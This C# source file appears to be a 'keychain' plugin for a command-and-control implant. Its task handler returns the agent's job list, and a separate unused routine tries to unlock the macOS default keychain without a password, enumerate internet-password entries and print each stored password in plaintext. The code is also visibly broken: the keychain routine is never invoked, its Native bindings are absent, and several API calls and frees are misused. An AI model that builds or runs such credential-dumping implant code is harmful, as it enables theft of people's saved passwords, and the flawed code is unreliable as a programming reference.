using Agent.Interfaces;
using System.Text.Json;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Text;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "keychain";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
            Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);

            await messageManager.AddResponse(new ResponseResult()
            {
                task_id = job.task.id,
                user_output = JsonSerializer.Serialize(jobsOut),
                completed = true
            });
        }
        public void DisplayKeychainContents()
        {
            IntPtr keychain = IntPtr.Zero;

            try
            {
                // Unlock the default keychain
                if (Native.SecKeychainCopyDefault(ref keychain) == Native.errSecSuccess)
                {
                    if (UnlockKeychain(keychain))
                    {
                        // Fetch and display keychain items
                        FetchAndDisplayKeychainItems(keychain);
                    }
                    else
                    {
                        Console.WriteLine("Failed to unlock the keychain.");
                    }
                }
                else
                {
                    Console.WriteLine("Failed to get the default keychain.");
                }
            }
            finally
            {
                if (keychain != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(keychain);
                }
            }
        }

        private bool UnlockKeychain(IntPtr keychain)
        {
            const int passwordLength = 0; // Keychain password is not required for unlocking

            int result = Native.SecKeychainUnlock(keychain, (uint)passwordLength, null, Native.kSecUnlockStateStatus);

            return result == Native.errSecSuccess;
        }

        private void FetchAndDisplayKeychainItems(IntPtr keychain)
        {
            IntPtr searchRef = IntPtr.Zero;

            try
            {
                if (Native.SecKeychainSearchCreateFromAttributes(keychain, Native.kSecClassInternetPassword, IntPtr.Zero, ref searchRef) == Native.errSecSuccess)
                {
                    IntPtr itemRef = IntPtr.Zero;

                    while (Native.SecKeychainSearchCopyNext(searchRef, ref itemRef) == Native.errSecSuccess)
                    {
                        DisplayKeychainItemContent(itemRef);
                        Native.SecKeychainItemFreeContent(itemRef);
                    }
                }
                else
                {
                    Console.WriteLine("Failed to create keychain search.");
                }
            }
            finally
            {
                if (searchRef != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(searchRef);
                }
            }
        }

        private void DisplayKeychainItemContent(IntPtr itemRef)
        {
            int length = 0;
            IntPtr data = IntPtr.Zero;

            try
            {
                if (Native.SecKeychainItemCopyContent(itemRef, ref length, ref data) == Native.errSecSuccess)
                {
                    byte[] passwordBytes = new byte[length];
                    Marshal.Copy(data, passwordBytes, 0, length);

                    string password = Encoding.UTF8.GetString(passwordBytes);
                    Console.WriteLine($"Keychain Item Password: {password}");
                }
                else
                {
                    Console.WriteLine("Failed to copy keychain item content.");
                }
            }
            finally
            {
                if (data != IntPtr.Zero)
                {
                    Native.SecKeychainItemFreeContent(data);
                }
            }
        }
    }
}
